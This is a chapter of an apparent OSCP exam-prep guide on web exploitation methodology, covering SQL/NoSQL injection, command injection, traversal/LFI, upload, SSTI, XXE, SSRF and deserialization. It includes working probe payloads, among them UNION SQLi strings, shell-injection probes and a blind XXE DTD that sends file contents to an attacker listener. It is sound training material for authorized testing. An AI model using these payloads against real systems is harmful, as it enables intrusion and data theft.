# 02 · Web Attacks (Foothold via Web)

Start with the origins and entry points mapped in [§01.5](01-recon-and-enumeration.md#15-http--https).
This chapter is for confirming a vulnerability, proving its prerequisites, and converting the
result into access. Preserve the exact working request; method, path, body type, cookies, CSRF,
Host/SNI, and authentication state are part of the exploit.

> 🚩 **EXAM:** SQLmap and other automated exploitation tools are prohibited. Burp Community,
> manual requests, and your own notes are usable under the current guide. Re-check the
> [official rules](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide)
> before the exam; AI/LLMs are prohibited during both the exam and report-writing phase.

---

## 2.1 Inventory every input surface

Test each input in every relevant unauthenticated and authenticated state.

| Surface | What to record |
|---|---|
| URL | path segments, query names/values, repeated parameters, encoding |
| Forms | method, action, visible and hidden fields, CSRF, submit-button values |
| JSON | keys, nested objects, arrays, booleans, numbers, `null`, omitted fields |
| XML | element text, attributes, namespaces, SOAP action, parser errors |
| Multipart | file bytes, `filename`/`filename*`, part MIME, companion fields |
| Headers | `Host`, `User-Agent`, `Referer`, `Origin`, `X-Forwarded-*`, `X-Original-URL` |
| Client state | cookies, JWTs, serialized preferences/state, role or object IDs |
| Stored input | profile fields, filenames, messages, templates, logs, admin-visible content |

Parameter names prioritize testing but do not prove a vulnerability:

- `file`, `page`, `path`, `include`, `lang`, `download` → traversal/file inclusion;
- `url`, `callback`, `webhook`, `image`, `avatar`, `import` → SSRF/redirect;
- `cmd`, `exec`, `host`, `ip`, `ping`, `dns` → command/argument injection;
- `id`, `search`, `sort`, `filter`, `order`, `login` → SQL/NoSQL/ORM injection;
- `template`, `message`, `subject`, `preview` → SSTI or stored/second-order use;
- XML, SOAP, SVG, office-document import → XXE/parser behavior;
- `state`, `prefs`, `session`, `data` blobs → deserialization;
- `role`, `admin`, `debug`, `format` → access control, mass assignment, or misconfiguration.

## 2.2 Establish a stable differential

Do not interpret one error, delay, or `500` as confirmation.

1. Replay the valid request two or three times to measure dynamic noise.
2. Save an invalid random value as the negative control.
3. Change one variable at a time: missing, empty, same-type random, boundary, type change,
   duplicate parameter, array/object instead of scalar.
4. Send vulnerability-specific matched pairs: true/false, fast/slow, existing/missing file, or a
   unique callback token.
5. Compare status, `Location`, body marker, bytes, words/lines, errors, timing, and side effects.
6. Repeat the decisive pair. A reproducible difference is evidence; a payload list is not.

```bash
# Capture a comparable response; preserve cookies/headers/body from the real request
curl -sk -D /tmp/headers -o /tmp/body \
  -w 'code=%{http_code} bytes=%{size_download} redirect=%{redirect_url} time=%{time_total}\n' \
  <url>

wc -c -w -l /tmp/body
sha256sum /tmp/body
```

Burp Repeater is usually faster for exact request replay. Use `curl --data-urlencode` or Burp's
encoder when metacharacters would otherwise be changed by the shell or URL parser.

⛔ If there is no differential, check request fidelity before adding more payloads: exact method,
body and `Content-Type`; cookie/CSRF/auth state; Host and TLS SNI; redirect handling; soft-404 or
dynamic content; alternate method/content type; then JS/API/backups/vhosts/CMS in §01.

## 2.3 Prioritize web paths

### Tier 1 — test whenever the surface exists

- authentication/reset/registration/access-control mistakes;
- exact vulnerable product, CMS plugin/module/theme, or exposed administrative feature;
- SQL/NoSQL/ORM injection, OS command injection, traversal/file inclusion, and upload;
- exposed source/config/backups, default credentials, debug mode, and writable WebDAV.

### Tier 2 — test when the application feature suggests it

- SSRF for URL fetch/import/webhook/proxy functions;
- XXE for XML/SOAP/SVG/document parsers;
- SSTI for template/preview/render functions;
- insecure deserialization for opaque structured client state.

### Tier 3 — require an interaction or meaningful server-side sink

- XSS/CSRF/CORS when an admin bot or authenticated victim action exists;
- prototype pollution only when a server-side merge reaches an authorization or code-execution
  sink.

### Authentication and access-control quick pass

- Check vendor defaults only after identifying the product; record the source of the default.
- Compare valid/invalid usernames using status, message, response length, and timing.
- Inspect reset tokens, host-derived reset links, registration roles, hidden fields, predictable IDs,
  and direct access to authenticated paths.
- Remove or change client-supplied role/owner/debug fields in a controlled account, one at a time.
- Decode JWTs and opaque-looking state to identify algorithm, claims, type, or serialization format;
  decoding is not proof that a signature can be forged.
- Before any guessing, determine rate limit and account lockout policy. Spraying reduces per-account
  rate; it does not eliminate lockout.

### Known component / public PoC

Confirm exact core and plugin/module version, route, auth level, feature state, OS, architecture,
and configuration. Read the source of the exploit and replace all hard-coded target, callback,
path, and payload values. Reject denial-of-service and destructive PoCs. Record every modification.

## 2.4 Convert findings into a foothold

Follow the shortest evidence-backed capability chain:

```text
AUTHENTICATE → admin/plugin/import/task feature → controlled execution
READ         → source/config/key/hash          → credential or exact exploit
WRITE        → consumed/executable location    → controlled execution
EXECUTE      → harmless proof                  → stable shell
REACH        → internal admin/API/service       → AUTHENTICATE / READ / EXECUTE
```

For each finding, write four lines:

- **Confirm:** the matched control that proves the behavior.
- **Prerequisites:** privilege, path, parser, handler, network egress, auth, or configuration needed.
- **Fastest capability:** the least destructive useful outcome (read config before writing a shell).
- **Fallback:** what to test if the preferred conversion is unavailable.

## 2.5 SQL injection

SQLi can occur in query parameters, forms, JSON/XML values, cookies, headers, path segments, and
stored data later used by another query. It may sit in `SELECT`, `UPDATE`, `INSERT`, or `ORDER BY`
context. Preserve the original data type and query behavior while testing.

### Confirm context with matched pairs

```sql
-- Numeric-context controls
1 AND 1=1
1 AND 1=2

-- Quoted-string controls; adjust quote and comment for the DB/context
' AND '1'='1'-- -
' AND '1'='2'-- -
```

Try a lone quote only as an error probe, then use a true/false pair. `OR 1=1` can affect every row
in an `UPDATE` or `DELETE`; avoid broad conditions until the query context is understood.

Common comments:

| DBMS | Comment form |
|---|---|
| MySQL/MariaDB | `#` or `-- ` (space required) or `/* ... */` |
| PostgreSQL | `-- ` or `/* ... */` |
| MSSQL | `-- ` or `/* ... */` |

### UNION flow

Find column count, then which column can display text. `NULL` minimizes type conflicts.

```sql
' ORDER BY 1-- -
' ORDER BY 2-- -
' ORDER BY 3-- -

-- Example only after three columns are confirmed
' UNION SELECT NULL,NULL,NULL-- -
' UNION SELECT NULL,'probe',NULL-- -
```

Fingerprint and enumerate with syntax matching the confirmed DBMS:

| Goal | MySQL/MariaDB | PostgreSQL | MSSQL |
|---|---|---|---|
| Version | `@@version` | `version()` | `@@version` |
| Database | `database()` | `current_database()` | `DB_NAME()` |
| Identity | `current_user()` | `current_user` | `SYSTEM_USER` |
| Tables | `information_schema.tables` | `information_schema.tables` | `information_schema.tables` |
| Columns | `information_schema.columns` | `information_schema.columns` | `information_schema.columns` |

Other common branches:

- **SQLite:** `sqlite_version()`, table definitions in `sqlite_master`, and columns through
  `SELECT * FROM pragma_table_info('<table>')`. It has no default network database account or
  built-in OS-command feature; use exposed data/source or an application-level primitive.
- **Oracle:** version banners in `v$version`, tables in `all_tables`, and columns in
  `all_tab_columns`; literal SELECTs commonly require `FROM dual`.

Keep the verified column count in every UNION request:

```sql
' UNION SELECT NULL,@@version,NULL-- -
' UNION SELECT NULL,table_name,NULL FROM information_schema.tables-- -
' UNION SELECT NULL,column_name,NULL FROM information_schema.columns WHERE table_name='users'-- -
```

If results are truncated, enumerate one row or substring at a time rather than assuming
`GROUP_CONCAT` exists or fits the response.

### Boolean, error, and time-based blind SQLi

Visible database errors can disclose type, query context, or selected data. After fingerprinting,
use a controlled type conversion and compare it with a valid conversion:

```sql
CAST((SELECT current_database()) AS int)    -- PostgreSQL: value may appear in the error
CONVERT(int, DB_NAME())                     -- MSSQL: value may appear in the error
```

Legacy MySQL/MariaDB targets may expose data through XML functions such as `EXTRACTVALUE`, but
these functions are version-dependent and absent from modern MySQL. Treat stack traces and
conversion errors as evidence to refine, not a reason to send destructive queries.

For boolean extraction, compare one character or length condition at a time:

```sql
' AND SUBSTRING((SELECT database()),1,1)='a'-- -                 -- MySQL
' AND SUBSTRING((SELECT current_database()),1,1)='a'-- -        -- PostgreSQL
' AND SUBSTRING(DB_NAME(),1,1)='a'-- -                           -- MSSQL
```

Time functions are DBMS- and context-specific. Use these as fragments, not universal payloads:

| DBMS | Conditional delay fragment |
|---|---|
| MySQL | `SELECT IF(<condition>,SLEEP(5),0)` |
| PostgreSQL | `SELECT CASE WHEN (<condition>) THEN pg_sleep(5) ELSE pg_sleep(0) END` |
| MSSQL | `IF (<condition>) WAITFOR DELAY '0:0:5'` |

Repeat fast/slow controls several times and account for server noise. Stacked statements depend on
the database driver; MySQL application APIs commonly disable them.

### SQLi to file or command execution — prove prerequisites first

**MySQL/MariaDB:** `LOAD_FILE()` and `SELECT ... INTO OUTFILE` require suitable database `FILE`
privilege. `secure_file_priv` may restrict the directory; the OS account needs filesystem access;
`OUTFILE` will not overwrite an existing file. Writing a server-side script also requires a known
web root and an executable handler.

```sql
SELECT @@secure_file_priv;
SELECT LOAD_FILE('/etc/hostname');
SELECT 'inert-probe' INTO OUTFILE '<known-writable-new-file>';
```

**MSSQL:** `xp_cmdshell` is disabled by default and normally requires high privilege to enable or
use. Check role and state before building a chain.

```sql
SELECT IS_SRVROLEMEMBER('sysadmin');
SELECT value_in_use FROM sys.configurations WHERE name='xp_cmdshell';
```

**PostgreSQL:** `COPY ... PROGRAM` requires superuser-like capability such as
`pg_execute_server_program`, plus a query context that can invoke it. Large objects and filesystem
functions have separate privileges and path constraints.

If the database cannot execute commands, prefer credentials, application secrets, password hashes,
or source/config paths that unlock another service. Use SQLmap only in non-exam labs where policy
permits it.

## 2.6 NoSQL and ORM injection

Test whether the framework changes a scalar into an operator object/array.

```text
# Form-style operator examples
username[$ne]=invalid&password[$ne]=invalid
password[$regex]=^a
```

```json
{"username":{"$ne":null},"password":{"$ne":null}}
```

Confirmation needs matched queries that should produce opposite results, not merely one `200`.
Also try missing keys, string→number/boolean/null, nested objects, arrays, duplicate parameters, and
JSON versus form encoding. The precondition is that the parser passes attacker-controlled structure
into a database/ORM query; many frameworks normalize these values safely.

Use a confirmed bypass to reach data or an authenticated function, then look for credentials,
administrative actions, or execution features.

## 2.7 OS command and argument injection

High-signal features include ping/DNS checks, image/document conversion, backup/archive, log search,
file operations, and wrappers around system utilities.

First determine whether input reaches a shell or is passed as one argument directly to a process.
Shell separators do not work when an API such as `execve(argv)` is used without a shell, but option
or argument injection may still exist.

```bash
# Unix shell probes
; id
| id
&& id
$(id)
`id`

# Windows cmd probes
& whoami
&& whoami
| whoami
```

For blind injection, compare repeated timing controls:

```text
# Unix
probe; sleep 0
probe; sleep 5

# Windows (ping count creates a measurable delay)
probe & ping -n 1 127.0.0.1 &
probe & ping -n 6 127.0.0.1 &
```

Alternatively, make a uniquely named HTTP/DNS request to a listener you control inside the
authorized lab. A callback proves server-side execution and may reveal OS/user, but egress can be
blocked. Account for quote context, URL/form encoding, whitespace filtering, and the original
command's required suffix.

Once `id`/`whoami` is reproducible, use the smallest appropriate payload from
[§03](03-shells-and-payloads.md) and record the exact encoded request.

## 2.8 Path traversal, file read, and file inclusion

Keep the capabilities separate:

| Finding | Proven capability | Extra requirement for execution |
|---|---|---|
| Path traversal/download | Read a chosen file | Another credential/exploit/write path |
| LFI | Server includes a local file | Included content must be interpreted as code |
| RFI | Server includes a remote resource | Remote inclusion enabled and reachable |

Use a known low-sensitivity file and a missing-file control:

```text
?file=../../../../etc/hostname
?file=/etc/hostname
?file=..\..\..\Windows\win.ini
?file=C:\Windows\win.ini
```

If normalization blocks the basic form, try nested traversal (`....//`), URL encoding, double
encoding, the expected base-directory prefix followed by traversal, and backslash/forward-slash
variants appropriate to the OS. Null-byte suffix tricks are legacy behavior; use them only when
the runtime/version makes the prerequisite plausible.

High-value reads:

- application source and route/controller files;
- `.env`, framework/app config, database connection strings, API keys, and CMS config;
- `/proc/self/cmdline`, `/proc/self/environ`, service units, and process-specific config on Linux;
- `web.config`, `appsettings.json`, PowerShell history, unattended/deployment files on Windows;
- user SSH keys and shell history when permissions allow.

For a confirmed PHP include/read sink, source can sometimes be encoded safely for retrieval:

```text
php://filter/convert.base64-encode/resource=index.php
```

### LFI to execution prerequisites

- **Upload then include:** know the stored path and control file content; the include sink must
  interpret it.
- **Log poisoning:** control a logged field, know the log path, have read permission, and confirm the
  include executes rather than prints it.
- **PHP session file:** control stored session data, know the session ID/path, and have a PHP include
  sink.
- **RFI/data wrapper:** relevant PHP options such as remote URL inclusion must be enabled.

Do not assume that a file read, EXIF field, or arbitrary upload automatically becomes code
execution. If execution prerequisites fail, use the read to recover source/config/credentials.

## 2.9 File upload and PUT

Map the entire upload pipeline before changing extensions:

```text
ACCEPT → VALIDATE → RENAME → STORE → SERVE → PARSE/EXECUTE
```

Upload an inert uniquely named text/image marker first. Record:

```bash
printf 'upload-probe-%s\n' "$(date +%s)" > /tmp/upload-probe.txt
curl -sk <url>/upload \
  -F '<file-field>=@/tmp/upload-probe.txt;type=text/plain' \
  -F '<csrf-field>=<token>'
```

- exact multipart part name, filename, part MIME, and companion/CSRF fields;
- whether validation is client-side, server-side, or both;
- returned ID/path, generated filename, storage origin, and retrieval authorization;
- whether bytes are preserved, transformed, re-encoded, extracted, or parsed;
- response `Content-Type`, download disposition, and server-side handler behavior.

Then change one validation axis at a time:

| Axis | Controlled variations |
|---|---|
| Extension | case, alternate stack extension, double extension, trailing dot/space where relevant |
| MIME | multipart part `Content-Type`; compare with actual bytes |
| Signature | valid minimal image/document magic plus inert marker |
| Filename | length, Unicode/normalization, collision, path separator/traversal handling |
| Content | small harmless server-side marker appropriate to the confirmed stack |
| Destination | user-controlled folder/path, archive extraction, overwrite behavior |

Choose payload type from the confirmed handler: PHP (`.php`, sometimes `.phtml`), ASP.NET
(`.aspx`), JSP/servlet containers (`.jsp`/`.war`), or another demonstrated mapping. An accepted
extension, spoofed MIME, or image magic does not matter if the storage origin never executes it.

If `OPTIONS` advertises `PUT`, test with an inert file, retrieve it, and determine whether that
location executes the relevant handler. If uploads are static-only, look for a separate LFI/include,
archive extraction, parser, or overwrite chain rather than cycling through extensions indefinitely.

```bash
curl -sk -X PUT --data-binary @/tmp/upload-probe.txt <url>/<unique-name>.txt
curl -sk <url>/<unique-name>.txt
```

Once a harmless execution marker works, replace it with the smallest web shell or reverse shell
from [§03](03-shells-and-payloads.md).

## 2.10 Server-side template injection (SSTI)

Use unique arithmetic/string controls to distinguish reflection from evaluation:

```text
{{7*7}}       → common Jinja2/Twig-style probe
${7*7}        → common expression-language probe
<%= 7*7 %>    → ERB/EJS-style probe
#{7*7}        → Pug-style probe
```

`{{7*'7'}}` can help distinguish Python-like repetition (`7777777`) from engines that return `49`
or an error, but no single probe fingerprints every engine. Identify the framework from headers,
errors, source, dependencies, and additional non-destructive expressions.

After engine identification, use a payload matched to the exact engine/version and available
objects. Hard-coded Python `__subclasses__()` indexes and assumed Node globals are runtime-dependent
and should not be kept as universal one-liners. Confirm a harmless command before delivering a
shell; sandboxing may limit the result to information disclosure.

## 2.11 XXE

High-signal inputs are raw XML, SOAP, SVG, XML-based document import, SAML, and endpoints that
change behavior when `Content-Type` is switched to XML.

```xml
<?xml version="1.0"?>
<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>
<r>&xxe;</r>
```

Use a known file/missing-file control. For SSRF, replace the entity URL with a scoped localhost or
internal HTTP endpoint. The XML parser must allow DTDs/external entities and the application must
expand the entity in a reachable location.

For blind XXE, host a DTD on your lab listener:

```xml
<!-- Request -->
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://<lhost>:8000/evil.dtd">
  %remote;
]>
<r/>
```

```xml
<!-- evil.dtd -->
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://<lhost>:8000/?d=%file;'>">
%eval;
%exfil;
```

OOB success requires external parameter entities and outbound connectivity; file contents with
characters invalid in a URL can break exfiltration. PHP stream wrappers are PHP-specific, not a
universal XML capability.

## 2.12 SSRF

Confirm the server, not the browser, made the request. Use a unique token at an HTTP listener you
control and compare a reachable/unreachable URL.

```text
?url=http://<lhost>:8000/ssrf-<unique-token>
?url=http://127.0.0.1:<port>/
?url=http://localhost:<port>/
```

Then prioritize scoped local/admin/API services that are known or strongly suggested by source,
errors, or port mappings. If filters block literal loopback, test alternative representations such
as `127.1`, decimal IP, or `[::1]`, and a controlled redirect from an allowed URL. Userinfo (`@`),
fragment (`#`), encoding, and URL-parser discrepancies matter only when they change the server's
validated-versus-requested destination.

Try non-HTTP schemes only if the fetch library supports them and the target service/path is within
scope. Cloud metadata is not the default OSCP standalone hypothesis without cloud evidence.

## 2.13 Insecure deserialization

Look for structured opaque blobs in cookies, parameters, files, or message bodies: PHP serialized
objects, Java serialization/base64, Python pickle, .NET formats, Ruby Marshal, or signed framework
state.

Before using a gadget chain, prove:

- the value reaches the corresponding deserializer;
- the target has the required class/library and a reachable magic method/gadget/sink;
- integrity signatures or encryption are absent, weak, or use a recovered key;
- the payload format and runtime version match.

Serialization normally transfers data and class references, not the methods of a class created on
your machine. A locally invented class is not an exploit unless a compatible target-side class and
dangerous behavior already exist. Prefer a harmless property/type change or error-based proof, then
use a source-reviewed gadget appropriate to the confirmed dependency set.

## 2.14 Browser-mediated and secondary paths

- **XSS:** first prove context-aware script execution with a harmless marker. Session theft requires
  an admin/victim to render it, useful cookie material, reachable callback, and no blocking control
  such as `HttpOnly`. Admin-only requests may still be possible without reading the cookie.
- **CSRF:** requires an authenticated victim action, accepted cross-site request, predictable
  parameters, and missing/ineffective CSRF and SameSite defenses.
- **IDOR/access control:** change one object ID/owner/role at a time between two controlled users or
  guest/auth states; compare read and write authorization separately.
- **Prototype pollution:** `__proto__` input matters only if a vulnerable merge reaches a useful
  server-side authorization, template, or code-execution sink.

Keep these time-boxed unless the application provides an admin bot, review queue, or another
credible interaction path.

## 2.15 Before you move on

- [ ] Every origin and auth state has a request/input map covering query, path, form, JSON/XML,
  multipart, cookies, and relevant headers.
- [ ] Each candidate behavior has a repeatable matched control; one error/delay/status is not the
  sole evidence.
- [ ] Auth/reset/registration/access control, exposed source/config, exact components, SQL/NoSQL,
  command, traversal/LFI, and upload were tested where the surface supports them.
- [ ] SSRF, XXE, SSTI, and deserialization were tested when an application feature made the parser
  or sink plausible.
- [ ] File-write, database-command, upload-execution, LFI-to-RCE, and gadget prerequisites were
  explicitly confirmed rather than assumed.
- [ ] A proven read/write/reach/auth capability was converted to the shortest access path, or its
  missing prerequisite and revisit trigger are recorded.
- [ ] Any RCE is reproducible and converted to a stable shell via [§03](03-shells-and-payloads.md).
- [ ] All newly discovered credentials, usernames, hostnames, paths, and versions were fed back
  into [§00](00-standalone-foothold-loop.md) and [§01](01-recon-and-enumeration.md).

## References

- [OWASP WSTG: Identify Application Entry Points](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/01-Information_Gathering/06-Identify_Application_Entry_Points)
- [PortSwigger SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [PortSwigger file upload vulnerabilities](https://portswigger.net/web-security/file-upload)
- [PortSwigger path traversal](https://portswigger.net/web-security/file-path-traversal)
- [OffSec OSCP+ Authoritative References](https://help.offsec.com/hc/en-us/articles/37192004980628-Authoritative-References-List-OSCP)
